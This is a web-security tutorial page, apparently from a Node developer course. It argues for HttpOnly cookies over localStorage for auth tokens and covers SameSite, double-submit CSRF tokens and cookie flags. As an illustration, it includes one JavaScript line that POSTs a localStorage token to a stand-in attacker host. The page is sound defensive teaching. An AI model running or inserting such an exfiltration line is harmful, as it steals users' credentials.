---
title: "Where to store tokens — cookies vs localStorage"
sidebar_label: "03 · Where to store tokens"
sidebar_position: 3
---

<span className="db-tier t-master">Master</span>

> Verified: 2026-08 on **Node 24.19.0**.

**`localStorage` is readable by any JavaScript on the page. An `HttpOnly` cookie is
not.** That single asymmetry decides this, and the usual counter-argument — "cookies
are vulnerable to CSRF" — describes a problem that `SameSite` largely solved and that
you can close completely.

## The two options

```js
// localStorage — the token is a string your own code reads
localStorage.setItem('token', accessToken);
fetch('/api/orders', {headers: {authorization: `Bearer ${localStorage.getItem('token')}`}});
```

```js
// HttpOnly cookie — set by the server, never visible to JavaScript
res.cookie('sid', sessionId, {
  httpOnly: true,     // document.cookie cannot see it
  secure:   true,     // HTTPS only
  sameSite: 'lax',    // not sent on cross-site POSTs
  path:     '/',
  maxAge:   86_400_000,
});
```

The difference is not convenience. It is who can read the credential.

| | `localStorage` | `HttpOnly` cookie |
|---|---|---|
| Readable by page JavaScript | **Yes** | **No** |
| Stolen by an XSS payload | **Yes, instantly** | No — but see below |
| Sent automatically | No | Yes |
| CSRF exposure | None | Mitigated by `SameSite`, closed by a token |
| Works cross-origin | Easily | Needs `credentials` + CORS config |
| Native mobile clients | Natural fit | Awkward |
| Survives a tab close | Yes | Yes, until `maxAge` |

## Why XSS beats CSRF as a concern

An XSS bug means attacker JavaScript runs on your origin. With `localStorage`:

```js
// one line in any injected script, or in a compromised dependency
fetch('https://attacker.example/collect', {method: 'POST', body: localStorage.getItem('token')});
```

The token is exfiltrated, silently, and remains valid wherever the attacker replays it
— from their machine, later, outside your logging. If it is a JWT, you probably cannot
revoke it ([page 02](./02-sessions-vs-jwt.md)).

With an `HttpOnly` cookie, the same XSS is still serious — the attacker can make
requests *as the user, from that page*, because the browser attaches the cookie. But
they cannot **read** the credential, so they cannot take it somewhere else. The blast
radius is bounded to a compromised session on a compromised page, rather than a stolen
credential with an independent life.

That is the whole argument, and it is why "just don't have XSS" is not an answer. You
are choosing what happens **when** the XSS bug arrives — in your code, or in one of the
several hundred packages in your dependency tree (page 23).

## Closing the CSRF side

CSRF is real but tractable, and mostly already handled:

**`SameSite=Lax`** is the default in current browsers and stops the classic attack — a
cross-site form auto-POSTing to your endpoint. Lax still sends the cookie on top-level
GET navigations, which is what keeps normal links working.

**`SameSite=Strict`** is tighter and costs usability: arriving from an external link
leaves the user logged out until they navigate again. Reasonable for an admin panel,
irritating for a consumer app.

**A CSRF token** closes what remains — same-site attacks, and older browsers. The
double-submit pattern needs no server storage:

```js
// issue: a random value in a readable cookie
const csrf = randomBytes(32).toString('base64url');
res.cookie('csrf', csrf, {sameSite: 'lax', secure: true});   // deliberately not HttpOnly

// verify: the header must match the cookie
const ok = req.get('x-csrf-token') &&
  timingSafeEqual(Buffer.from(req.get('x-csrf-token')), Buffer.from(req.cookies.csrf));
```

It works because an attacker's site can *cause* a request carrying your cookies but
cannot *read* them to populate the header — the same-origin policy stops that.

Only state-changing requests need it. And note the `timingSafeEqual`
([page 16](./16-timing-attacks.md)) — it needs equal lengths, which fixed-size random
tokens give you.

## The hybrid, and where it goes wrong

The common production shape:

- **Refresh token** — opaque, revocable, `HttpOnly` `Secure` cookie, `SameSite=Lax`,
  scoped with `path=/auth/refresh` so it is not sent on every request.
- **Access token** — short-lived JWT, held **in memory** in the SPA, never persisted.

In-memory means a page reload loses it, and the app silently calls the refresh endpoint
to get a new one. That is the right trade: the long-lived credential is unreadable, and
the short-lived one dies with the tab.

**What goes wrong is putting the access token back into `localStorage` "so refresh is
faster".** That reintroduces exactly the exposure the design existed to avoid, and it is
the most common way this architecture is quietly undone.

`sessionStorage` is not a fix either — it is `localStorage` with a shorter life and the
same readability.

## Cookie flags that are not optional

```js
res.cookie('sid', sessionId, {
  httpOnly: true,
  secure:   true,                       // never sent over plain HTTP
  sameSite: 'lax',
  path:     '/',
  domain:   undefined,                  // host-only — do not widen to .example.com
  maxAge:   86_400_000,
});
```

**`secure`** matters even on an HTTPS site: without it, one accidental `http://` link
sends the credential in clear text. **`domain`** left unset keeps the cookie host-only;
setting `.example.com` shares it with every subdomain, including whatever marketing
deployed on `promo.example.com`. And **`__Host-` prefixed names** (`__Host-sid`) are
enforced by the browser to be secure, host-only and path `/` — a useful belt-and-braces
when you control the client.

## Choosing

**Browser app, same origin as the API:** `HttpOnly` cookie session. Simplest, safest,
smallest.

**Browser SPA on a different origin:** cookies still work — `credentials: 'include'`,
CORS with an explicit origin and `Access-Control-Allow-Credentials`. It is configuration,
not a blocker.

**Native mobile or a third-party API client:** bearer tokens, stored in the platform
keystore. There is no `HttpOnly` there and no browser CSRF, so the trade-off is
different — this is the case `localStorage` reasoning is borrowed from, and it does not
transfer to browsers.

## Gotchas

**Symptom:** Sessions hijacked after an XSS report
**Cause:** The token was in `localStorage`, readable by injected script.
**Fix:** `HttpOnly` cookie; keep any in-memory access token out of storage.

**Symptom:** Login works locally, fails in production
**Cause:** `secure: true` with the app served over HTTP, or a cross-origin request
without `credentials: 'include'`.
**Fix:** HTTPS everywhere; set CORS credentials and an explicit origin.

**Symptom:** Cross-site requests silently lose the session
**Cause:** `SameSite=Lax` or `Strict` doing its job.
**Fix:** If the flow genuinely is cross-site, `SameSite=None; Secure` **plus** a CSRF
token — never `None` alone.

**Symptom:** A subdomain leaked the session cookie
**Cause:** `domain: '.example.com'` widened its scope.
**Fix:** Leave `domain` unset for host-only; consider a `__Host-` prefix.

**Symptom:** The user is logged out on every page refresh
**Cause:** The access token is in memory, by design, and the refresh call is missing or
failing.
**Fix:** Implement silent refresh — do not "fix" it by persisting the token.

**Symptom:** CSRF protection blocks legitimate requests
**Cause:** The token is checked on safe methods, or is missing from the client.
**Fix:** Only verify state-changing methods; send the header from one shared client.

## Interview questions

**★ `localStorage` or cookies for auth tokens — and why?**
`HttpOnly` cookies. `localStorage` is readable by any script on the page, so a single
XSS bug — yours or a dependency's — exfiltrates the credential, and it stays valid
wherever the attacker replays it. An `HttpOnly` cookie cannot be read, so the same XSS
is bounded to acting as the user on that page rather than stealing a portable
credential.

**★ But don't cookies have a CSRF problem?**
They did. `SameSite=Lax` is the browser default now and stops the classic cross-site
form POST, and a double-submit CSRF token closes what remains. CSRF is a solved,
configurable problem; XSS-stolen tokens are not, because the credential leaves your
control entirely.

**★ How does the double-submit CSRF pattern work?**
Issue a random value in a readable cookie and require it echoed in a header. An
attacker's site can cause a request that carries your cookies but cannot read them to
set the header, because the same-origin policy blocks it. No server-side storage
needed — and compare the two values with `timingSafeEqual`.

**★ Where does an SPA keep a short-lived access token?**
In memory, not in any storage. The revocable refresh token lives in an `HttpOnly`
cookie scoped to the refresh path, and the app silently re-fetches an access token
after a reload. Persisting the access token "for convenience" reintroduces the exact
exposure the design avoids.

**Which cookie flags are mandatory?**
`httpOnly`, `secure`, and a deliberate `sameSite`. Leave `domain` unset so the cookie
stays host-only rather than shared with every subdomain. A `__Host-` name prefix makes
the browser enforce the first three for you.

**Is `sessionStorage` safer than `localStorage`?**
No. It is scoped to the tab and cleared when it closes, but it is equally readable by
any script on the page, which is the property that matters.

---

← Prev: [Sessions vs JWT](./02-sessions-vs-jwt.md) · Next → Authentication vs authorization *(being written)*
